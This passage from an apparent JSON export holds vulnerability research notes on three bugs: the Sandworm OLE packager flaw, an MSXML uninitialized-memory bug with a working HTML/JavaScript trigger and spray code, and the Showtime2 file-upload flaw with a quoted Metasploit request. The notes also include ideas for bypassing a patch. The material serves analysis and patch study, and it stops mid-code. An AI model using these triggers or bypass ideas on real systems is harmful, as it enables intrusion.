      "document": "\n\n# SETUP\n\n* Windows 7 SP1\n* Office 2013 (full install)\n* packager.dll 6.1.7600.16385 (Mon Jul 13 20:09:25 2009)\n\n\n# Details\n\nCVE-2014-4114, also known as Sandworm, is a vulnerability found in Windows OLE that allows remote\ncode execution. It was found in the wild as a PowerPoint file, originally discovered by ESET, and\nwas patched on Oct 14, 2014.\n\nThe vulnerability has to do with how the Object Packager 2 (packager.dll) component handles an\nINF file that contains malicious registry changes, which can lead to code execution. First of all,\nPackager cannot load the INF file directly, but you can trick it to load your INF file anyway\nby embedding the file path as a remote share in an OLE object. When it's embedded as an OLE object,\nit's possible to make Packager to treat your malicious file as a media file. There are 6 media\nformats supported: SOUNDREC, OLE1SOUNDREC, MPlayer, OLE1MPlayer, AVIFile, MIDFile. The MPlayer\nformat is the one to go for our case, because this will be loaded by the\npackager!CPackage::OLE2MPlayerReadFromStream function, which also triggers a CopyFileW call. The\nCopyFileW function will download the malicious file from the remote share, save it under the\ntemp folder, and then pass that information that will be used later.\n\nThe following callstack can illustrate the work flow of the loading process:\n\n```\nChildEBP RetAddr\n0029eb98 6ff94b85 packager!CPackage::CreateTempFileName\n0029ebb0 6ff94f0a packager!CPackage::OLE2MPlayerReadFromStream+0x118\n0029ec14 6ff9665c packager!CPackage::LoadMMStorage+0xe5\n0029ec48 75bceb44 packager!CPackage::Load+0xbb\n0029ecb8 75bcf2af ole32!wCreateObject+0x1fc [d:\\w7rtm\\com\\ole32\\ole232\\base\\create.cpp @ 3108]\n0029ed1c 75bcf1d4 ole32!OleLoadWithoutBinding+0x9c [d:\\w7rtm\\com\\ole32\\ole232\\base\\create.cpp @ 1576]\n0029ed44 60c6d608 ole32!OleLoad+0x37 [d:\\w7rtm\\com\\ole32\\ole232\\base\\create.cpp @ 1495]\n```\n\nThe actual exploit will try to abuse the above loading routine twice: The first is the fake gif\nfile, and the other is the INF file. The purpose of that is to make INF file rename the gif one\nto .exe, which will happen later.\n\nAfter the streams are loaded, the Packager component will also look at each OLE object's command\nnode in their XML file (in the exploit in the wild, this can be found in slide/slide1.xml), and\ndetermine what media command needs to happen. These media commands are also known as the\n\"XML Presentation Command class\", which is described in the following:\nhttp://msdn.microsoft.com/en-us/library/documentformat.openxml.presentation.command(v=office.14).aspx\n\nThe command class/node is presented as the following XML syntax:\n\n```\n<p:cmd type=\"type\" cmd=\"cmd\">\n```\n\nFrom the above syntax, there are two important properties: \"type\" and \"cmd\". We'll explain what\neach does.\n\nThe type property supports the following:\n\n* call - Used to call methods on the object specified (play(), pause(), etc.)\n* evt - Used to set an event for the object at this point in the timeline (onstopaudio, etc.)\n* verb - Used to set verbs for the object to occur at this point in the timeline (0, 1, etc.)\n\nThe cmd property supports the following:\n\n* call        - play corresponding media\n* play        - play corresponding media starting from s, where s is the number of seconds from the\n                beginning of the clip.\n* pause       - pause corresponding media\n* resume      - resume play of corresponding media\n* stop        - stop play of corresponding media\n* togglePause - play corresponding media if media is already paused, pause corresponding media if\n                media is already playing. If the corresponding media is not active, this command\n                restarts the media and plays from its beginning.\n* onstopaudio - stop play of all audio\n\nHowever, when you're using the verb type, you have the following commands:\n\n* 0 - Open the object for editing\n* 1 - Open the object for viewing\n* 3 - Undocumented. But this is what the exploit is using to get the inf to run.\n\nNote that the exploit uses two OLE objects, so there are two commands for each. The first one is\nfor the fake slide1.gif file. It uses the \"verb\" type, with cmd of \"-3\":\n\n```\n<p:cmd type=\"verb\" cmd=\"-3\">\n...\n</p:cmd>\n\nThe inf file also uses the \"verb\" type, but with cmd of \"3\":\n\n<p:cmd type=\"verb\" cmd=\"3\">\n...\n</p:cmd>\n```\n\nThe reason the \"verb\" type is used is because this will trigger the packager!CPackage::DoVerb\nfunction in the Packager component. When this function sees the slide1.gif file, it will bail right\naway due to the -3 cmd. We don't want it to do anything. However, when the function sees the INF\nfile, which uses cmd 3, it will ask Windows to find the appropriate handler, which will give us\nC:\\Windows\\System32\\infDefaultInstall.exe, and that process will be used to install our malicious\nINF file via a CreateProcessW call, and then results in arbitrary code execution.\n\nThe following callstack should illustrate the work flow that leads to code execution:\n\n```\nChildEBP RetAddr\n0029db78 767e55c1 kernel32!CreateProcessW\n0029dc70 767f2bda SHELL32!_SHCreateProcess+0x251\n0029dcc4 767e53c5 SHELL32!CExecuteApplication::_CreateProcess+0xfc\n0029dcd4 767e5379 SHELL32!CExecuteApplication::_TryCreateProcess+0x2e\n0029dce4 767e47d1 SHELL32!CExecuteApplication::_DoApplication+0x48\n0029dcf4 767ff6b1 SHELL32!CExecuteApplication::Execute+0x33\n0029dd14 767e4a1c SHELL32!CExecuteAssociation::_DoCommand+0x88\n0029dd38 767ff733 SHELL32!CExecuteAssociation::_TryApplication+0x41\n0029dd58 76800ff1 SHELL32!CExecuteAssociation::Execute+0x5f\n0029dd88 76800f22 SHELL32!CRegDataDrivenCommand::_Invoke+0xe2\n0029dd9c 76801175 SHELL32!CRegDataDrivenCommand::InvokeFromContextMenu+0x18\n0029ddc8 768010d8 SHELL32!CRegistryVerbsContextMenu::_Execute+0x5a\n0029e03c 7680056c SHELL32!CRegistryVerbsContextMenu::InvokeCommand+0xa4\n0029e0c0 76800444 SHELL32!HDXA_LetHandlerProcessCommandEx+0x132\n0029e3a0 6ff95ee0 SHELL32!CDefFolderMenu::InvokeCommand+0x1ca\n0029ee6c 66a62eea packager!CPackage::DoVerb+0x374\n```\n\n\n# OTHER INTERESTING THINGS FOUND DURING REVERSING\n\n* The DoVerb function is also where the bug was for MS12-005 (Microsoft ClickOnce Vulnerability).\n  That vuln was due to the CPackage::_GiveWarningMsg function using a weak list of dangerous/executeable\n  files (such as a Python file, Ruby, etc).\n\n* Before the INF is run, a \"Zone Check\" will trigger by shell32. This means it is possible to\n  cause the exploit to fail if the target machine has very strict IE zone settings.\n\n* For some reason, the exploit seems to crash with Office 2010 + Win 7 SP1 due to a null pointer\n  dereference in DoVerb -> CPackage::GetContextMenu -> packager!CPackage::CreateTempFileName.\n\n# PATCHING\n\nThe patch is found in packager.dll. A MarkFileUnsae() function is introduced in\nCPackage::OLE2MPlayerReadFromStream(). With the patch, the INF should trigger a prompt that\nwarns the user about the operation.\n\nHowever, someone claims the following:\n\n\"KB2919355 (Windows 8.1 update) remove InfDefaultInstall.exe from g_lpAutoApproveEXEList in\nappinfo.dll, thx cve-2014-4114 for the help\" - https://twitter.com/w4kfu/status/522492861225639936\n\nI looked at that specific KB2919355 patch, and there is no appinfo.dll in there. BUT, the claim\nseems plausible becaues g_lpAutoApproveEXEList does have infDefaultInstall.exe in there:\n\n```\n.data:0624B054 ?g_lpAutoApproveEXEList@@3PAPBGA dd offset aCttunesvr_exe\n.data:0624B054                                         ; DATA XREF: AipIsAutoApprovalEXE(ushort const *)+E\u0018o\n.data:0624B054                                         ; \"cttunesvr.exe\"\n.data:0624B058                 dd offset aInetmgr_exe  ; \"inetmgr.exe\"\n.data:0624B05C                 dd offset aInfdefaultinst ; \"infdefaultinstall.exe\"\n.data:0624B060                 dd offset aMigsetup_exe ; \"migsetup.exe\"\n.data:0624B064                 dd offset aMigwiz_exe   ; \"migwiz.exe\"\n.data:0624B068                 dd offset aMmc_exe      ; \"mmc.exe\"\n.data:0624B06C                 dd offset aOobe_exe     ; \"oobe.exe\"\n.data:0624B070                 dd offset aPkgmgr_exe   ; \"pkgmgr.exe\"\n.data:0624B074                 dd offset aProvisionshare ; \"provisionshare.exe\"\n.data:0624B078                 dd offset aProvisionstora ; \"provisionstorage.exe\"\n.data:0624B07C                 dd offset aSpinstall_exe ; \"spinstall.exe\"\n.data:0624B080                 dd offset aWinsat_exe   ; \"winsat.exe\"\n```\n\n# References\n\n* http://blog.vulnhunt.com/index.php/2014/10/14/cve-2014-4114_sandworm-apt-windows-ole-package-inf-arbitrary-code-execution/\n* http://en.wikipedia.org/wiki/INF_file\n* https://www.youtube.com/watch?v=I77CGqQvPE4\n* http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-windows-zero-day-vulnerability-cve-2014-4114-aka-sandworm/\n* http://msdn.microsoft.com/en-us/library/documentformat.openxml.presentation.command(v=office.14).aspx\n\n=== The Patch\n\nMicrosoft patched this vulnerability with MS14-060\n\nhttps://technet.microsoft.com/en-us/library/security/ms14-060.aspx\n\n* Apparently the patch failed, and the packager.dll component is exploitable still (CVE-2014-5352)\n\n* Patch analysis: http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/CVE-2014-6352-OLE-packager-vulnerability-and-a-failed-patch-for/ba-p/6653598?device-view=desktop#.VF64-fTF-VL\n\nThe HP analysis I think isn't 100% accurate, according to my bindiff the patch MS14-060 is adding a call \"MarkFileUnsafe\" to different methods available to drop files to the filesystem:\n\n* OLE2MplayerReadFromStream\n* OLE1SoundRecReadFromStream\n* OLE2SoundRecReadFromStream\n\n=== Ideas to bypass patch\n\n* Idea 1: Obvious one, find another path where the \"MarkFileUnsafe\" has been forgotten. Unfortunately with static analysis I've not found nothing interesting.\n* Idea 2: The abused function hasn't been killed, the droped files are just marked as unsafe... so maybe working with other file types can have some success.\n\nThe original exploit basically embeds packager objects as OLE streams, allowing:\n\n* To drop arbitrary files to temp => It can be done also after the patch.\n* Also use the \"famous\" CmdVerb = 3, which basically simulates a right click and then left click on the \"alternate\" option. When used on a INF file it simulates a click on the \"Install\" option.\n\nSo the idea here is to find a file type whose second option in the right click is interesting. For example, when I install the \"Geany\" Editor, windows automatically adds the \"Open With Geany\" option with a lot of file types. I can embedd any file of these types inside a package, then inside an OLE, and run the ppsx. The \"Geany\" editor is executed automatically and tries to open the file, since \"Geany\" isn't marked as unsafe at all, and the editor isn't trying to execute nothing.\n\nThe idea would be to found a filetype which can be opened through the second option of the contextual menu, and it allows to embed code (scripting)\n\nAt the moment I've not found other file type whose second choice in the right click menu (contextual menu) is interesting for exploitation. I've tried powershell, but since the file is marked as unsafe a warning arises when powershell tries to execute it directly.\n\n(There are some reports about this idea being used in the wild with ppsx's directly embedding an EXE, and going through \"run it as an Administrator\", but in this way UAC triggers.\n\n* Idea 3: Try other CmdVerb's to analyze other parts of the CmdVerb function not triggered.\n\n\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "afd39caa-afe0-4970-90d8-6bdcbf4c691b",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "ac628aef-fd96-4b84-8a20-368e27d16854",
      "created": "2019-09-12T18:07:48.859108Z",
      "revisionDate": "2020-10-19T22:53:56.921022Z",
      "document": "\n\nThis is known as a \"state-sponsored \" 0-day to attack certain Gmail users. It has been committed as msxml_get_definition_code_exec.rb in the Metasploit Framework. However, the current version only targets IE6/7 on Windows XP, because the uninitialized memory is on the heap on those targets. On Win Vista + IE 7 and Win XP + IE8, however, it is on the\nstack.\n\n# Debugging Notes\n\nCrash:\n\n```\n0:008> r\neax=020bf2f0 ebx=00000000 ecx=00000000 edx=00000001 esi=020bf2f0 edi=020bf528\neip=749bd772 esp=020bf1a8 ebp=020bf2e4 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nmsxml3!_dispatchImpl::InvokeHelper+0xb4:\n749bd772 ff5118          call    dword ptr [ecx+18h]  ds:0023:00000018=????????\n\n0:008> k\nChildEBP RetAddr\n020bf2e4 749bdb13 msxml3!_dispatchImpl::InvokeHelper+0xb4\n020bf320 749d4d84 msxml3!_dispatchImpl::Invoke+0x5e\n020bf360 749dcae4 msxml3!DOMNode::Invoke+0xaa\n020bf394 749bd5aa msxml3!DOMDocumentWrapper::Invoke+0x50\n020bf3f0 749d6e6c msxml3!_dispatchImpl::InvokeEx+0xfa\n020bf420 633a6d37 msxml3!_dispatchEx<IXMLDOMNode,&LIBID_MSXML2,&IID_IXMLDOMNode,0>::InvokeEx+0x2d\n020bf460 633a6c75 jscript!IDispatchExInvokeEx2+0xf8\n020bf49c 633a9cfe jscript!IDispatchExInvokeEx+0x6a\n020bf55c 633a9f3c jscript!InvokeDispatchEx+0x98\n020bf590 633a77ff jscript!VAR::InvokeByName+0x135\n020bf5dc 633a85c7 jscript!VAR::InvokeDispName+0x7a\n020bf60c 633a9c0b jscript!VAR::InvokeByDispID+0xce\n020bf7a8 633a5ab0 jscript!CScriptRuntime::Run+0x2989\n020bf890 633a59f7 jscript!ScrFncObj::CallWithFrameOnStack+0xff\n020bf8dc 633a5743 jscript!ScrFncObj::Call+0x8f\n020bf958 633891f1 jscript!CSession::Execute+0x175\n020bf9a4 63388f65 jscript!COleScript::ExecutePendingScripts+0x1c0\n020bfa08 63388d7f jscript!COleScript::ParseScriptTextCore+0x29a\n020bfa30 635bf025 jscript!COleScript::ParseScriptText+0x30\n020bfa88 635be7ca mshtml!CScriptCollection::ParseScriptText+0x219\n```\n\nThe crash occurs in dispatchImpl::InvokeHelper(), where:\n\n```\n.text:749BD751 mov     eax, dword ptr [ebp+pvarg.anonymous_0+8]  ;pvarg.anonymous_0+8 = pvarg.lVal\n.text:749BD754 cmp     eax, ebx                       ; This checks if eax is null, but doesn't check if [eax] is null\n.text:749BD756 mov     esi, eax\n.text:749BD758 jz      short loc_749BD780\n.text:749BD75A push    [ebp+arg_20]\n.text:749BD75D mov     ecx, [eax]                     ; Null pointer dereference, because we didn't check [eax]\n.text:749BD75F push    [ebp+arg_1C]\n.text:749BD762 push    [ebp+arg_18]\n.text:749BD765 push    edi\n.text:749BD766 push    3\n.text:749BD768 push    [ebp+arg_C]\n.text:749BD76B push    offset _GUID_NULL\n.text:749BD770 push    ebx\n.text:749BD771 push    eax\n.text:749BD772 call    dword ptr [ecx+18h]             ; Crash\n```\n\nHeap vs Stack:\n\nSome setups allocate the data on the heap, or a simple heap spray will just do the trick.\nBut some setups allocate it on the stack, which is a little trick.  We found the following solution\nfrom baidu to put data on the stack:\n\n```\nvar src = unescape(\"%u1111%u1111\");\nwhile (src.length < 0x1002) src += src;\nsrc = \"\\\\\\\\xxx\" + src;\nsrc = src.substr(0, 0x1000 - 10);\nvar pic = document.createElement(\"img\");\npic.src = src;\npic.nameProp;\n```\n\nSo in the end, this is how we trigger the bug:\n\n```\n<object classid=\"clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4\" id=\"#{object_id}\"></object>\n<script>\nvar obj = document.getElementById('#{object_id}').object;\nvar src = unescape(\"%u0c08%u0c0c\");\nwhile (src.length < 0x1002) src += src;\nsrc = \"\\\\\\\\\\\\\\\\xxx\" + src;\nsrc = src.substr(0, 0x1000 - 10);\nvar pic = document.createElement(\"img\");\npic.src = src;\npic.nameProp;\nobj.definition(#{rand(999) + 1});\n</script>\n```\n\nFinal version of the exploit:\nhttps://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/msxml_get_definition_code_exec.rb\n\n# Analysis\n\nVupen published a nice blog post about advanced exploitation with this bug here:\n\nhttp://www.vupen.com/blog/20120717.Advanced_Exploitation_of_Internet_Explorer_XML_CVE-2012-1889_MS12-043.php\n\nUnfortunately, the presented exploitation techniques can not be used if we can not control the\nuninitialized data in the stack:\n\n```\n.text:727457A0                 lea     eax, [ebp+vtDisp]\n.text:727457A3                 push    eax             ; pvarg\n.text:727457A4                 call    ds:__imp__VariantInit@4 ; VariantInit(x)\n.text:727457AA                 push    ebx\n.text:727457AB                 lea     eax, [ebp+vtDisp]\n.text:727457AE                 push    eax\n.text:727457AF                 push    2\n.text:727457B1                 push    ebx\n.text:727457B2                 push    [ebp+dispid]\n.text:727457B5                 push    [ebp+pTarget]\n.text:727457B8                 call    dword ptr [esi+20h] ; DOMNode::_invokeDOMNode\n.text:727457BB                 cmp     eax, ebx\n.text:727457BD                 jl      loc_72740BB6\n```\n\nAs VUPEN explained in their blog post, DOMNode::_invokeDOMNode should init the memory location at ebp+vtDisp,\nbut it's not always true, so controlling ebp+vtDisp allow to reach:\n\n```\n.text:727457C3                 mov     eax, dword ptr [ebp+vtDisp.___u0+8] ; Danger: it isn't ebp+vtDisp, but ebp+vtDisp+8\n.text:727457C6                 mov     esi, eax\n.text:727457C8                 cmp     eax, ebx\n.text:727457CA                 jz      short loc_727457F5\n.text:727457CC                 push    [ebp+puArgErr]\n.text:727457CF                 mov     ecx, [eax]      ; crash\n.text:727457D1                 push    [ebp+pExcepInfo]\n.text:727457D4                 push    [ebp+pVarResult]\n.text:727457D7                 push    edi\n.text:727457D8                 push    3\n.text:727457DA                 push    [ebp+lcid]\n.text:727457DD                 push    offset _GUID_NULL\n.text:727457E2                 push    ebx\n.text:727457E3                 push    eax\n.text:727457E4                 call    dword ptr [ecx+18h]\n.text:727457E7                 mov     [ebp+hr], eax\n.text:727457EA                 mov     eax, [esi]\n.text:727457EC                 push    esi\n.text:727457ED                 call    dword ptr [eax+8]\n```\n\nWhere the memory in the stack can be used to do interesting thing. The problem is how to put interesting objects\nin the stack, since the pic.nameProp; method doesn't look usefull at all. There is a lack of documentation in the\nVUPEN blog post about how to make it happen, since it assumes you can control the memory in the stack, and just\nexplores the exploitation possibilities.\n\nThere is a clue? in the VUPEN blog:\n\n\"The vulnerable variable can be assigned according to the way xmlDoc.definition is called. There are many ways to\nput a particular pointer in the vulnerable variable. We can use for example introspection on an object and call\nxmlDoc.definition on each of its attributes to list the available objects\"\n\nHonestly, here is where VUPEN impresses me, because atm I don't spot how to put a \"partirular pointer in the\nvulnerable variable\". Even when playing with introspection seems to allow some results:\n\n```\n<html>\n<body onload=\"f()\">\n\n <div id=\"div\">\n <object id=\"obj\" style=\"display:none\"></object>\n </div>\n\n <pre id=\"results\">\n\n </pre>\n\n <script>\n function f() {\n    var test = new ActiveXObject(\"Msxml2.DOMDocument.6.0\");\n    var results = document.getElementById(\"results\");\n\n    results.innerHTML += \"obj attributes: </br>\";\n\n    var count = 0\n    for (var v in obj) {\n        results.innerHTML += v;\n        results.innerHTML += \"<br />\";\n        if (count == 0)\n            test.definition(v)\n        count++;\n    }\n    alert(count)\n\n    var o = obj.cloneNode()\n    div.appendChild(o)\n\n    results.innerHTML += \"After append, new obj attributes <br />\"\n\n    count = 0\n    for (var v in obj) {\n        results.innerHTML += v;\n        results.innerHTML += \"<br />\";\n        count++\n    }\n    alert(count)\n\n  }\n </script>\n\n</body>\n</html>\n```\n\n\nMakes the next crash:\n\n```\n0:004> r\neax=605aa838 ebx=00000000 ecx=5d5b5e5f edx=00000001 esi=605aa838 edi=021fa2a8\neip=703457e4 esp=021f9f2c ebp=021fa068 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\nmsxml6!_dispatchImpl::InvokeHelper+0xb3:\n703457e4 ff5118          call    dword ptr [ecx+18h]  ds:0023:5d5b5e77=????????\n0:004> dd eax\n605aa838  5d5b5e5f 890008c2 ffff5c8d ea38e9ff\n605aa848  c88bffff 8306e9c1 840f01e1 0015ef37\n605aa858  5421d233 c9851024 ef32840f 8c8b0015\n605aa868  00008c24 83fa2b00 048d03e1 fffffcbd\n605aa878  89c10bff 008c2484 e8c10000 24448902\n605aa888  247c831c 840f0010 fffff7f0 15ef26e9\n605aa898  0f178b00 c10852b6 82f704e2 6066392c\n605aa8a8  00004000 9ae5850f ef830017 0ff83b04\n0:004> u eax\nmshtml!CElement::put_innerHTML+0x75:\n605aa838 5f              pop     edi\n605aa839 5e              pop     esi\n605aa83a 5b              pop     ebx\n605aa83b 5d              pop     ebp\n605aa83c c20800          ret     8\n605aa83f 898d5cffffff    mov     dword ptr [ebp-0A4h],ecx\n605aa845 e938eaffff      jmp     mshtml!CSpliceTreeEngine::RemoveSplice+0x7ec (605a9282)\n605aa84a 8bc8            mov     ecx,eax\n```\n\nSecond try, just follow the VUPEN's instructions:\n\n```\n<html>\n<body onload=\"f()\">\n\n <div id=\"div\">\n <object id=\"obj\" style=\"display:none\"></object>\n </div>\n\n <pre id=\"results\">\n\n </pre>\n\n <script>\n function f() {\n    var test = new ActiveXObject(\"Msxml2.DOMDocument.6.0\");\n\n    var count = 0\n    for (var v in obj) {\n        if (count == 0)\n            test.definition(v)\n        count++;\n    }\n    alert(count)\n\n    var o = obj.cloneNode()\n    div.appendChild(o)\n\n    count = 0\n    for (var v in obj) {\n        v;\n    }\n\n  }\n </script>\n\n</body>\n</html>\n```\n\n\nGenerates an ugly crash, which doesn't look profitable at all :\\\n\n```\n(d14.df0): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000001 ebx=00000000 ecx=703701f2 edx=00000001 esi=00000001 edi=0227a2c8\neip=703457cf esp=02279f6c ebp=0227a088 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\nmsxml6!_dispatchImpl::InvokeHelper+0x9e:\n703457cf 8b08            mov     ecx,dword ptr [eax]  ds:0023:00000001=????????\n```\n\nAnother try, trying to get definition, at the end of instrospection:\n\n```\n<html>\n<body onload=\"f()\">\n\n <div id=\"div\">\n <object id=\"obj\" style=\"display:none\"></object>\n </div>\n\n <pre id=\"results\">\n\n </pre>\n\n <script>\n function f() {\n    var test = new ActiveXObject(\"Msxml2.DOMDocument.6.0\");\n\n    var count = 0\n    for (var v in obj) {\n        if (count == 175)\n            test.definition(v)\n        count++;\n    }\n    alert(count)\n\n    var o = obj.cloneNode()\n    div.appendChild(o)\n\n    count = 0\n    for (var v in obj) {\n        v;\n    }\n\n  }\n </script>\n\n</body>\n</html>\n```\n\n\nSame crash:\n\n```\n0:005> g\n(1ac.bb0): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000001 ebx=00000000 ecx=703701f2 edx=00000001 esi=00000001 edi=022f9e50\neip=703457cf esp=022f9af4 ebp=022f9c10 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\nmsxml6!_dispatchImpl::InvokeHelper+0x9e:\n703457cf 8b08            mov     ecx,dword ptr [eax]  ds:0023:00000001=????????\n```\n\n\nMaybe with fuzzing :? time to grinder...\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "ea3a49d8-5a49-4523-9772-5cb9bf10573b",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "ee71c50d-5a60-4738-908d-a92a3adb937d",
      "created": "2019-09-12T18:07:50.974398Z",
      "revisionDate": "2020-02-13T17:12:09.623157Z",
      "document": "\n\n## Background\n\nCMS Made Simple (CMSMS) is an open source content management system. It can be used for various purposes such as galleries, company and user directories, guestbooks, E-Commerce, blogs, etc, depending on the module the user installs. It is written in PHP, and runs on MySQL.\n\nOne of the commonly downloaded modules for CMSMS is called Showtime2, a slideshow feature. In it, the watermark support allows an authenticated user (likely an administrator) to upload a watermark image, which can be abused to upload a malicious payload.\n\nA Metasploit module was submitted on March 19th 2019, which allowed me to investigate the vulnerability.\n\n## Vulnerability Analysis\n\n### Environment Setup\n\nIn order to analyize the vulnerability, we need to set up a vulnerable environment. The minimal requirements are:\n\n* A Ubuntu VM that supports Apache, PHP, and MySQL.\n* CMS Made Simple. Since the vulnerability doesn't actually come from the CMS, the latest should work.\n* A vulnerable version of [Showtime2](<http://dev.cmsmadesimple.org/project/files/1365>). You can just download the XML file, and import it from the module manager in CMSMS. Once imported, an \"install\" button will be available for you to actually install the vulnerable Showtime2 module.\n\n### Debugging CMSMS\n\nLike other exploit analysis cases, we usually start off with a proof-of-concept from the Metasploit module, and this one is no exception. Since the vulnerability involves uploading something over HTTP, the key moment would be this block of code from the exploit:\n\n```ruby\ndata = Rex::MIME::Message.new\ndata.add_part('Showtime2,m1_,defaultadmin,0', nil, nil, \"form-data; name=\\\"mact\\\"\")\ndata.add_part('Upload', nil, nil, \"form-data; name=\\\"m1_upload_submit\\\"\")\ndata.add_part(@csrf_value, nil, nil, \"form-data; name=\\\"#{@csrf_name}\\\"\")\ndata.add_part(fcontent, 'text/plain', nil, \"from-data; name=\\\"m1_input_browse\\\"; filename=\\\"#{fname}\\\"\")\n\nres = send_request_cgi(\n  'method' => 'POST',\n  'uri' => normalize_uri(target_uri, 'admin', 'moduleinterface.php'),\n  'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n  'data' => data.to_s,\n  'headers' => {\n    'Cookie' => @cookies\n    }\n  )\n```\n\nWe can see that the exploit uses the Metasploit's HttpClient API to make a request to `admin/moduleinterface.php`, so this would be our starting point for the analysis. What is the application doing to our malicious upload request? Let's check it out.\n\nBy looking at the source code for `moduleinterface.php`, my high level understanding of the code is that this is meant for loading a third-party module. One of the first things we see is the use of the `mact` parameter, and how the code wants to split that into multiple variables:\n\n```php\nif (isset($_REQUEST['mact'])) {\n    $ary = explode(',', cms_htmlentities($_REQUEST['mact']), 4);\n    $module = (isset($ary[0])?$ary[0]:'');\n    $id = (isset($ary[1])?$ary[1]:'m1_');\n    $action = (isset($ary[2])?$ary[2]:'');\n}\n```\n\nBased on the `mact` data coming from the exploit, we can break down our data to these:\n\n* module = \"Showtime2\"\n* id = \"m1_\"\n* action = \"defaultadmin\"\n\nAfter that, `moduleinterface.php ` creates a new instance for the module the exploit asked by doing:\n\n```php\n$modinst = ModuleOperations::get_instance()->get_module_instance($module);\n```\n\nWe know that the exploit is requesting the Showtime2 module, which means `$modinst` is technically a Showtime2 object (found as `Showtime2.module.php`), and it extends CMSModule (the base class that can be found as `class.CMSModule.php`). Once the instance is ready, the module interface triggers an action toward the end of the code:\n\n```php\n$modinst->DoActionBase($action, $id, $params, '', $smarty);\n```\n\nFor a CMSMS module, the term \"action\" means the a feature to support. For example, if you have a module that supports editing a slideshow, then you could call your action \"editslideshow\", and this would be implemented as its own PHP file.\n\nThe `DoAction*` methods actually come from CMSModule (the base class the Showtime2 object extends from), and it basically triggers a PHP file to be included from the modules directory (oh and look, there is even a directory traversal patch):\n\n```php\nif ($name != '') {\n  //Just in case DoAction is called directly and it's not overridden.\n  //See: http://0x6a616d6573.blogspot.com/2010/02/cms-made-simple-166-file-inclusion.html\n  $name = preg_replace('/[^A-Za-z0-9\\-_+]/', '', $name);\n\n  $filename = $this->GetModulePath().'/action.' . $name . '.php';\n  if( !is_file($filename) ) {\n    @trigger_error(\"$name is an unknown acton of module \".$this->GetName());\n    throw new \\CmsError404Exception(\"Module action not found\");\n  }\n\n  // these are included in scope in the included file for convenience.\n  $gCms = CmsApp::get_instance();\n  $db = $gCms->GetDb();\n  $config = $gCms->GetConfig();\n  $smarty = ( $this->_action_tpl ) ? $this->_action_tpl : $smarty = $gCms->GetSmarty()->get_template_parent();\n  include($filename);\n}\n```\n\nIf you recall what the exploit is sending in the `mact` parameter, the specific action we should be looking for is `defaultadmin`. So based on the above code, we should be looking at `action.defaultadmin.php` in Showtime2's directory.\n\nAnd that's about how much we need to know about the mechanics of CMSMS, let's move on to the Showtime2 code.\n\n### Debugging Showtime2's defaultadmin Action\n\nThe most interesting part of the `defaultadmin` action code is of course the upload routine, which occurs almost at the beginning of the file:\n\n```php\nif( isset($params['upload_submit'])){\n  $params = array('active_tab' => 'watermark');\n\n  $fieldName=$id.'input_browse';\n\n  if (!isset ($_FILES[$fieldName]) || !isset ($_FILES)\n    || !is_array ($_FILES[$fieldName]) || !$_FILES[$fieldName]['name']){\n    $params['message'] = $this->Lang('error_nofilesuploaded');\n    $smarty->assign('message',$this->Lang('error_nofilesuploaded'));\n  }else{\n    $file = $_FILES[$fieldName];\n    // cleanup the filename\n    $pos = strrpos($file['name'], '.');\n    $alias = substr($file['name'], 0, $pos);\n    $alias = preg_replace('/[^a-z0-9-_]+/i','-',$alias);\n    $alias = trim($alias . substr($file['name'], $pos), '-');\n    $uploadfile = $config['image_uploads_path'].'/'. $alias;\n\n    if (!@move_uploaded_file($file['tmp_name'], $uploadfile)) {\n      $smarty->assign('message',$this->Lang('error_nofilesuploaded'));\n    }else{\n      chmod($uploadfile, 0644);\n      $this->SetPreference(\"watermark_file\", $alias);\n      $smarty->assign('message',$this->Lang('file_uploaded'));\n      $create_watermark =true;\n    }\n  }\n}\n```\n\nAfter the file is uploaded, it is treated as an image. For example, the next step after the upload is watermarking the image:\n\n```php\nif  ($create_watermark){\n  $source_image = '../modules/Showtime2/images/watermark_example_org.jpg';\n  $dest_image = '../modules/Showtime2/images/watermark_example_new.jpg';\n  if(!showtime2_image::watermark_image($source_image,$dest_image,false)){\n    $smarty->assign('message',$this->Lang('watermark_warning'));\n  }\n}\n```\n\nBut really, there is way to be sure whether the user uploaded is an image or not; the code just assumes it is. This is what allows the attacker to upload whatever they want and leave a backdoor on the target server.\n\nAnd this is how much we need to know about the vulnerability. Now that we know how CMSMS utilizes module interface to load a module, and how our file is uploaded, let's look at the patch.\n\n## Patch Analysis\n\nAccording to the diff [here](<http://viewsvn.cmsmadesimple.org/diff.php?repname=showtime2&path=%2Ftrunk%2Flib%2Fclass.showtime2_image.php&rev=47>), we know that the patch is implemented in the `watermark_image` function in `class.showtime2_image.php`. And it went from the vulnerable code like this (from rev 14)\n\n```php\n$watermark_file = $mod->GetPreference('watermark_file');\nif ($watermark_file=='watermark.png'){\n  $watermark_file = $config['root_path'].'/modules/Showtime2/images/watermark.png';\n}else{\n  $watermark_file = $config['image_uploads_path'].'/'.$watermark_file;\n}\nif (!file_exists($watermark_file)) return false;\n```\n\nTo this (rev 47, with the log message indicating this is a security fix):\n\n```php\n$watermark_file = $mod->GetPreference('watermark_file');\nif ($watermark_file=='watermark.png'){\n  $watermark_file = $config['root_path'].'/modules/Showtime2/images/watermark.png';\n}else{\n  $watermark_file = $config['image_uploads_path'].'/'.$watermark_file;\n}\n$fext = strtoupper(substr($watermark_file, strrpos($watermark_file, '.')));\nif 